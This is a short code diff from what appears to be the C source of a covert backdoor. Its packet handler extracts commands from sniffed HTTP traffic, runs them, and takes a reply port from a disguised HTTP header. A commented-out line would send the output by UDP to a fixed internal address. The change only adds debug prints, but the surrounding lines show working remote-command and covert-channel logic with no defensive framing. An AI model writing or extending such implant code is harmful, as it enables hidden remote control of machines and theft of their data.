@@ -183,15 +183,17 @@ void process_packet(unsigned char* buffer, int size) {
     // Get command, run command, get output
     const char *command = http_to_command(http_payload, http_data_size);
     if (command == NULL) return;
+    printf("Command: %s\n", command);
     const char *output = run_command(command);
     if (output == NULL) return;
+    printf("Output: %s\n", output);
 
     // Get return port
     char *return_port_string = get_http_header(http_payload, "Upgrade-Insecure-Requests");
     if (return_port_string == NULL) return;
     int return_port = atoi(return_port_string);
     if (return_port == 0) return;
-
+    printf("Return port: %d\n", return_port);
     
     // send_udp_packet("10.42.2.16", return_port, output);
 
